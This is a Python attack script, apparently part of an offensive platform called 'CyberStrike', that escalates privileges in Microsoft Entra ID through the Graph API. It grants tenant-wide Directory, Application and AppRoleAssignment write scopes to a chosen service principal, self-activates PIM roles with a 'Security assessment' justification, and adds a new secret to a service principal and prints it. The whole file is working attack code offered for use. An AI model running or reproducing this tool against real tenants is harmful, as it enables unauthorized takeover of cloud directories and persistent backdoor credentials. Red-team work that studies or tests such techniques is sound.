#!/usr/bin/env python3
"""
entra_privesc.py — Entra ID Privilege Escalation

Exploits Entra ID misconfigurations via illicit consent grants,
PIM role activation, and service principal credential injection.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    import requests
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)

GRAPH_BASE = "https://graph.microsoft.com/v1.0"
GRAPH_BETA = "https://graph.microsoft.com/beta"
STATE_FILE = str(Path.home() / ".cyberstrike" / "azurehook-state.json")


def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"created_resources": []}


def save_state(state):
    os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2, default=str)


class EntraPrivEsc:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.token = args.token or os.environ.get("AZURE_ACCESS_TOKEN", "")
        self.state = load_state()

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Entra ID Privilege Escalation")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Method:    {self.args.method}")
        print(f"Token:     {'set' if self.token else 'NOT SET'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            action = record.get("action", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{action.upper():<16}] [{status.upper():<8}] {detail}", flush=True)

    def headers(self):
        return {"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"}

    def track_resource(self, resource_type, resource_id, **extra):
        entry = {"type": resource_type, "id": resource_id, "created_at": datetime.now().isoformat()}
        entry.update(extra)
        self.state["created_resources"].append(entry)
        save_state(self.state)

    def method_consent_grant(self):
        me_r = requests.get(f"{GRAPH_BASE}/me", headers=self.headers(), timeout=30)
        if me_r.status_code != 200:
            self.emit({"action": "consent", "status": "failed", "detail": f"Cannot get identity: HTTP {me_r.status_code}"})
            return

        sps = requests.get(f"{GRAPH_BASE}/servicePrincipals", headers=self.headers(), params={"$filter": "appId eq '00000003-0000-0000-c000-000000000000'"}, timeout=30)
        if sps.status_code != 200 or not sps.json().get("value"):
            self.emit({"action": "consent", "status": "failed", "detail": "Cannot find Microsoft Graph SP"})
            return

        graph_sp_id = sps.json()["value"][0]["id"]
        target_sp_id = self.args.sp_id

        if not target_sp_id:
            self.emit({"action": "consent", "status": "failed", "detail": "--sp-id required for consent_grant method"})
            return

        scopes = ["Directory.ReadWrite.All", "Application.ReadWrite.All", "AppRoleAssignment.ReadWrite.All"]

        for scope in scopes:
            if not self.running:
                break
            body = {
                "clientId": target_sp_id,
                "consentType": "AllPrincipals",
                "resourceId": graph_sp_id,
                "scope": scope,
            }
            r = requests.post(f"{GRAPH_BASE}/oauth2PermissionGrants", headers=self.headers(), json=body, timeout=30)
            if r.status_code in (200, 201):
                grant_id = r.json().get("id", "unknown")
                self.track_resource("consent_grant", grant_id, scope=scope, sp_id=target_sp_id)
                self.emit({"action": "consent", "status": "success", "detail": f"Granted {scope} to SP {target_sp_id}", "grant_id": grant_id})
            else:
                self.emit({"action": "consent", "status": "failed", "detail": f"Grant {scope}: HTTP {r.status_code} {r.text[:200]}"})

    def method_pim_activate(self):
        role_id = self.args.role_id
        if not role_id:
            roles_r = requests.get(f"{GRAPH_BETA}/roleManagement/directory/roleEligibilityScheduleInstances", headers=self.headers(), timeout=30)
            if roles_r.status_code == 200:
                eligible = roles_r.json().get("value", [])
                for er in eligible:
                    self.emit({
                        "action": "pim_eligible",
                        "status": "info",
                        "detail": f"Eligible: {er.get('roleDefinitionId')} principal={er.get('principalId')}",
                        "role_definition_id": er.get("roleDefinitionId"),
                        "principal_id": er.get("principalId"),
                        "directory_scope_id": er.get("directoryScopeId"),
                    })
                if not eligible:
                    self.emit({"action": "pim_activate", "status": "failed", "detail": "No eligible PIM roles found"})
            else:
                self.emit({"action": "pim_activate", "status": "failed", "detail": f"Cannot list eligible roles: HTTP {roles_r.status_code}"})
            return

        me_r = requests.get(f"{GRAPH_BASE}/me", headers=self.headers(), timeout=30)
        principal_id = me_r.json().get("id") if me_r.status_code == 200 else None
        if not principal_id:
            self.emit({"action": "pim_activate", "status": "failed", "detail": "Cannot determine principal ID"})
            return

        body = {
            "action": "selfActivate",
            "principalId": principal_id,
            "roleDefinitionId": role_id,
            "directoryScopeId": "/",
            "justification": "Security assessment",
            "scheduleInfo": {
                "startDateTime": datetime.utcnow().isoformat() + "Z",
                "expiration": {"type": "afterDuration", "duration": "PT8H"},
            },
        }
        r = requests.post(f"{GRAPH_BETA}/roleManagement/directory/roleAssignmentScheduleRequests", headers=self.headers(), json=body, timeout=30)
        if r.status_code in (200, 201):
            self.track_resource("pim_activation", role_id, principal_id=principal_id)
            self.emit({"action": "pim_activate", "status": "success", "detail": f"Activated role {role_id} for {principal_id}"})
        else:
            self.emit({"action": "pim_activate", "status": "failed", "detail": f"HTTP {r.status_code}: {r.text[:300]}"})

    def method_sp_secret(self):
        sp_id = self.args.sp_id
        if not sp_id:
            self.emit({"action": "sp_secret", "status": "failed", "detail": "--sp-id required"})
            return

        body = {
            "passwordCredential": {
                "displayName": f"cs-{int(time.time())}",
                "endDateTime": "2026-12-31T23:59:59Z",
            }
        }
        r = requests.post(f"{GRAPH_BASE}/servicePrincipals/{sp_id}/addPassword", headers=self.headers(), json=body, timeout=30)
        if r.status_code in (200, 201):
            cred = r.json()
            self.track_resource("sp_secret", sp_id, key_id=cred.get("keyId"))
            self.emit({
                "action": "sp_secret",
                "status": "success",
                "detail": f"Added secret to SP {sp_id}",
                "sp_id": sp_id,
                "key_id": cred.get("keyId"),
                "secret_text": cred.get("secretText"),
                "display_name": cred.get("displayName"),
                "end_date": cred.get("endDateTime"),
            })
        else:
            self.emit({"action": "sp_secret", "status": "failed", "detail": f"HTTP {r.status_code}: {r.text[:300]}"})

    def run(self):
        self.print_banner()

        if not self.token:
            print("ERROR: Access token required. Set --token or AZURE_ACCESS_TOKEN env var.", file=sys.stderr)
            sys.exit(1)

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        methods = {
            "consent_grant": self.method_consent_grant,
            "pim_activate": self.method_pim_activate,
            "sp_secret": self.method_sp_secret,
        }

        method_fn = methods.get(self.args.method)
        if not method_fn:
            print(f"ERROR: Unknown method '{self.args.method}'. Available: {', '.join(methods.keys())}", file=sys.stderr)
            sys.exit(1)

        method_fn()
        self.cleanup()

    def cleanup(self):
        print(f"\n--- entra_privesc summary ---")
        print(f"Method: {self.args.method}")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Entra ID privilege escalation via consent grants, PIM activation, and SP secrets.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 entra_privesc.py --method consent_grant --sp-id <SP_ID> --token $TOKEN\n"
            "  python3 entra_privesc.py --method pim_activate --role-id <ROLE_DEF_ID>\n"
            "  python3 entra_privesc.py --method sp_secret --sp-id <SP_ID>\n"
        ),
    )
    parser.add_argument("--method", type=str, required=True, help="Method: consent_grant|pim_activate|sp_secret")
    parser.add_argument("--sp-id", type=str, default=None, help="Service principal ID")
    parser.add_argument("--role-id", type=str, default=None, help="PIM role definition ID")
    parser.add_argument("--token", type=str, default=None, help="Azure AD access token")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    privesc = EntraPrivEsc(args)
    privesc.run()


if __name__ == "__main__":
    main()
